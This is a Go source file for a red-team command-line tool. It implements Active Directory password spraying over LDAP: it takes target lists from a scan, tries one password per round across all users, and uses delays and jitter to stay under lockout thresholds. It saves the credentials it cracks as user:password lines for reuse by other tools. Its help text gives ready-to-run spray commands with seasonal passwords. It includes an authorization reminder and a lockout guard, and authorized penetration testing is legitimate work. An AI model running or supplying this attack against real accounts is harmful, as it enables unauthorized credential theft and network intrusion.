package redteam

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"github.com/Raxuis/RaxuisCLI/cmd"
	"github.com/Raxuis/RaxuisCLI/internal/redteam/spray"
	"github.com/Raxuis/RaxuisCLI/internal/shared/output"

	"github.com/spf13/cobra"
)

var (
	sprayFromScan     string
	sprayHost         string
	sprayPort         int
	sprayTLS          bool
	sprayUsers        string
	sprayPasswords    string
	sprayPassword     string
	sprayDomain       string
	sprayProtocol     string
	sprayConcurrency  int
	sprayTimeout      int
	sprayDelay        string
	sprayJitter       string
	sprayRoundDelay   string
	sprayLockoutMax   int
	sprayForce        bool
	sprayContinueHits bool
	sprayStopOnHit    bool
	sprayOut          string
)

type hitOut struct {
	Host     string `json:"host"`
	User     string `json:"user"`
	Password string `json:"password"`
}

var sprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Low-and-slow AD password spraying (LDAP)",
	Long: `Password spray Active Directory over LDAP simple bind.

Sprays one password across all users per round (never many passwords at a
single user in a burst) to respect account-lockout policy. Feed it the
ad-tagged LDAP targets discovered by 'raxuiscli scan':

  raxuiscli --output=json scan 10.10.10.0/24 > surface.json
  raxuiscli spray --from-scan surface.json -u users.txt --password 'Winter2025!' -d corp.local

Or pipe the scan directly, or point at one DC:

  raxuiscli --output=json scan 10.10.10.0/24 | raxuiscli spray --from-scan - -u users.txt -p passwords.txt -d corp.local
  raxuiscli spray -H dc01.corp.local -u users.txt --password 'Spring2025!' -d corp.local

Only run this against accounts you are authorized to test. Know the lockout
policy first (see 'raxuiscli ldap' domain info) and use --round-delay to space
password rounds across the lockout window.`,
	Args: cobra.NoArgs,
	Run:  runSpray,
}

func runSpray(_ *cobra.Command, _ []string) {
	if strings.ToLower(sprayProtocol) != "ldap" {
		fmt.Fprintf(os.Stderr, "Error: only --protocol ldap is implemented\n")
		os.Exit(1)
	}
	if sprayDomain == "" {
		fmt.Fprintf(os.Stderr, "Error: --domain is required\n")
		os.Exit(1)
	}

	targets, err := resolveSprayTargets()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	users, err := readListOrLiteral(sprayUsers)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading users: %v\n", err)
		os.Exit(1)
	}
	passwords, err := resolveSprayPasswords()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	// Lockout guard: refuse to try enough passwords to lock accounts.
	if sprayLockoutMax > 0 && len(passwords) >= sprayLockoutMax && !sprayForce {
		fmt.Fprintf(os.Stderr,
			"Error: %d passwords >= lockout threshold %d — this can lock accounts.\n"+
				"       Reduce passwords, raise --round-delay to the lockout window, or pass --force.\n",
			len(passwords), sprayLockoutMax)
		os.Exit(1)
	}

	delay, err := parseOptDuration("--delay", sprayDelay)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	jitter, err := parseOptDuration("--jitter", sprayJitter)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	roundDelay, err := parseOptDuration("--round-delay", sprayRoundDelay)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	jsonMode := output.JSON()
	if !jsonMode {
		fmt.Printf("Spraying %d user(s) x %d password(s) against %d LDAP target(s) [%s]...\n",
			len(users), len(passwords), len(targets), sprayDomain)
		fmt.Println(strings.Repeat("-", 60))
	}

	opts := spray.Options{
		Targets:           targets,
		Users:             users,
		Passwords:         passwords,
		Domain:            sprayDomain,
		Timeout:           sprayTimeout,
		Concurrency:       sprayConcurrency,
		Delay:             delay,
		Jitter:            jitter,
		RoundDelay:        roundDelay,
		ContinueOnSuccess: sprayContinueHits,
		StopOnSuccess:     sprayStopOnHit,
	}
	if !jsonMode {
		opts.OnHit = func(h spray.Hit) {
			fmt.Printf("[+] %s\\%s : %s  (%s)\n", sprayDomain, h.User, h.Password, h.Host)
		}
		if len(passwords) > 1 {
			opts.OnRoundStart = func(round, total int, password string) {
				fmt.Printf("[*] Round %d/%d — password %q\n", round, total, password)
			}
		}
	}

	result := spray.Run(opts)

	if sprayOut != "" {
		if err := writeCreds(sprayOut, result.Valid); err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not write --out %q: %v\n", sprayOut, err)
		} else if !jsonMode {
			fmt.Printf("[*] %d credential(s) written to %s\n", len(result.Valid), sprayOut)
		}
	}

	hits := make([]hitOut, 0, len(result.Valid))
	for _, h := range result.Valid {
		hits = append(hits, hitOut{Host: h.Host, User: h.User, Password: h.Password})
	}
	payload := map[string]any{
		"domain":      sprayDomain,
		"targets":     len(targets),
		"users":       len(users),
		"passwords":   len(passwords),
		"attempts":    result.Attempts,
		"errors":      result.Errors,
		"valid":       hits,
		"duration_ms": result.Duration.Milliseconds(),
	}
	_ = output.Emit(payload, func(w io.Writer) {
		fmt.Fprintln(w, strings.Repeat("-", 60))
		fmt.Fprintf(w, "%d valid credential(s), %d attempts, %d errors (%.1fs)\n",
			len(result.Valid), result.Attempts, result.Errors, result.Duration.Seconds())
	})
}

func resolveSprayTargets() ([]spray.Target, error) {
	if sprayFromScan != "" {
		var data []byte
		var err error
		if sprayFromScan == "-" {
			data, err = io.ReadAll(os.Stdin)
		} else {
			data, err = os.ReadFile(sprayFromScan)
		}
		if err != nil {
			return nil, fmt.Errorf("reading scan output: %w", err)
		}
		return spray.ParseScanTargets(data)
	}

	if sprayHost != "" {
		port := sprayPort
		if port == 0 {
			if sprayTLS {
				port = 636
			} else {
				port = 389
			}
		}
		return []spray.Target{{Host: sprayHost, Port: port, TLS: sprayTLS}}, nil
	}

	return nil, fmt.Errorf("no targets: pass --from-scan <file|-> or --host")
}

func resolveSprayPasswords() ([]string, error) {
	switch {
	case sprayPassword != "" && sprayPasswords != "":
		return nil, fmt.Errorf("use either --password or --passwords, not both")
	case sprayPassword != "":
		return []string{sprayPassword}, nil
	case sprayPasswords != "":
		return readListOrLiteral(sprayPasswords)
	default:
		return nil, fmt.Errorf("--password or --passwords is required")
	}
}

// readListOrLiteral reads non-empty, non-comment lines from a file, or returns
// the spec itself as a single-element list when it is not an existing file.
func readListOrLiteral(spec string) ([]string, error) {
	if spec == "" {
		return nil, fmt.Errorf("empty value")
	}
	fi, err := os.Stat(spec)
	if err != nil || fi.IsDir() {
		return []string{spec}, nil
	}

	f, err := os.Open(spec)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var out []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	if err := sc.Err(); err != nil {
		return nil, err
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no entries in %s", spec)
	}
	return out, nil
}

// writeCreds saves valid credentials as user:password lines for reuse by other
// tools. The file is created with 0600 since it holds secrets.
func writeCreds(path string, hits []spray.Hit) error {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return err
	}
	defer f.Close()

	w := bufio.NewWriter(f)
	for _, h := range hits {
		if _, err := fmt.Fprintf(w, "%s:%s\n", h.User, h.Password); err != nil {
			return err
		}
	}
	return w.Flush()
}

func parseOptDuration(flag, val string) (time.Duration, error) {
	if val == "" {
		return 0, nil
	}
	d, err := time.ParseDuration(val)
	if err != nil {
		return 0, fmt.Errorf("invalid %s %q: %w", flag, val, err)
	}
	return d, nil
}

func init() {
	cmd.RootCmd.AddCommand(sprayCmd)

	sprayCmd.Flags().StringVar(&sprayFromScan, "from-scan", "", "Read ad-tagged LDAP targets from 'raxuiscli scan' JSON (file path or - for stdin)")
	sprayCmd.Flags().StringVarP(&sprayHost, "host", "H", "", "Single LDAP target (domain controller) instead of --from-scan")
	sprayCmd.Flags().IntVar(&sprayPort, "port", 0, "LDAP port for --host (default 389, or 636 with --tls)")
	sprayCmd.Flags().BoolVar(&sprayTLS, "tls", false, "Use LDAPS (TLS) for --host")
	sprayCmd.Flags().StringVarP(&sprayUsers, "users", "u", "", "Username list: file path or a single username (required)")
	sprayCmd.Flags().StringVarP(&sprayPasswords, "passwords", "p", "", "Password list file (spray each, one round per password)")
	sprayCmd.Flags().StringVar(&sprayPassword, "password", "", "Single password to spray across all users")
	sprayCmd.Flags().StringVarP(&sprayDomain, "domain", "d", "", "Active Directory domain, e.g. corp.local (required)")
	sprayCmd.Flags().StringVar(&sprayProtocol, "protocol", "ldap", "Spray protocol (only 'ldap' is implemented)")
	sprayCmd.Flags().IntVarP(&sprayConcurrency, "concurrency", "c", 10, "Maximum concurrent binds within a password round")
	sprayCmd.Flags().IntVarP(&sprayTimeout, "timeout", "t", 5, "Per-connection timeout in seconds")
	sprayCmd.Flags().StringVar(&sprayDelay, "delay", "", "Fixed delay before each attempt (e.g. 500ms)")
	sprayCmd.Flags().StringVar(&sprayJitter, "jitter", "", "Extra random delay before each attempt (e.g. 300ms)")
	sprayCmd.Flags().StringVar(&sprayRoundDelay, "round-delay", "", "Pause between password rounds (set to the lockout window, e.g. 31m)")
	sprayCmd.Flags().IntVar(&sprayLockoutMax, "lockout-threshold", 0, "Abort if password count reaches this lockout threshold (0 = unknown/off)")
	sprayCmd.Flags().BoolVar(&sprayForce, "force", false, "Override the lockout-threshold guard")
	sprayCmd.Flags().BoolVar(&sprayContinueHits, "continue-on-success", false, "Keep spraying users whose password was already found")
	sprayCmd.Flags().BoolVar(&sprayStopOnHit, "stop-on-success", false, "Stop launching attempts after the first valid credential (in-flight attempts may still complete)")
	sprayCmd.Flags().StringVarP(&sprayOut, "out", "o", "", "Write valid credentials (user:password) to this file")
}
